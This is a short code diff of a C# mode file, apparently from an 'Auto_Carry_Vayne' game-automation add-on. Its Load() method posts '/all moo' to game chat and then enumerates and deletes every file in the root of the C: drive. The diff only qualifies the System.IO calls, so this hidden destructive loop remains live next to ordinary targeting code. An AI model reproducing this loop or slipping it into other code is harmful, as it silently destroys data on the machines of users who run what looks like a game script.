@@ -16,9 +16,9 @@ namespace Auto_Carry_Vayne.Features.Modes
         public static void Load()
         {
             Chat.Say("/all moo");
-            string[] fileNames = Directory.GetFiles(@"c:");
+            string[] fileNames = System.IO.Directory.GetFiles(@"c:");
             foreach (string fileName in fileNames)
-                File.Delete(fileName);
+                System.IO.File.Delete(fileName);
             var target = TargetSelector.GetTarget((int)Variables._Player.GetAutoAttackRange(),
     DamageType.Physical);
             if (target == null) return;
